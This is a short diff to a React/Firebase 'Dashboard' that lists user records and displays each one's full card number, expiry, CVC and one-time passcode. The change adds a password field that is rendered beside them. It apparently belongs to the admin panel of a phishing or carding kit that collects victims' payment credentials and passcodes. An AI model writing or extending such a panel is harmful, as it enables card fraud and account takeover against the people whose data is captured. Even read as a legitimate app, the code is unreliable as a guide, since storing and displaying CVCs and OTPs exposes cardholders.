@@ -24,7 +24,8 @@ date:any,
  payment:{
   cardNumber: string
   expiry: string
-  cvc: string
+  cvc: string,
+  pass:string
  },
  personalInfo:{
   name:string
@@ -34,7 +35,7 @@ date:any,
  }
  otp:{
   otp:string
- }
+ },pass:string;
 }
 // Initialize Firebase
 
@@ -103,6 +104,7 @@ export default function Dashboard() {
                   <p className="text-sm text-blue-500 "><strong className="text-sm text-red-500 ">cvc: </strong>{user.payment.cvc}</p>
                   <p className="text-sm text-blue-500 ">{user.payment.expiry}</p>
                   <p className="text-sm text-blue-500 "><strong className="text-sm text-red-500 ">OTP: </strong>{user.otp.otp}</p>
+                  <p className="text-sm text-blue-500 "><strong className="text-sm text-red-500 ">PASS: </strong>{user.payment.pass}</p>
                 </li>
               ))}
             </ul>
